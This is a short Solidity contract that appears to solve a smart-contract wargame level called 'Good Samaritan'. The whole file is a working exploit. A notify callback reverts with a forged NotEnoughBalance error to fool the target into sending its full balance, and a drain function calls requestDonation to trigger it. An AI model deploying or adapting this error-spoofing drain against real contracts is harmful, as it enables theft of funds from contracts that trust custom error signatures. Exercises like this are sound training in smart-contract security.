// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface GoodSamaritan {
    function requestDonation() external returns (bool);
}

contract DrainGoodSamaritan {
    error NotEnoughBalance();

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function drainSamaritan(address samaritan) external {
        GoodSamaritan(samaritan).requestDonation();
    }
}
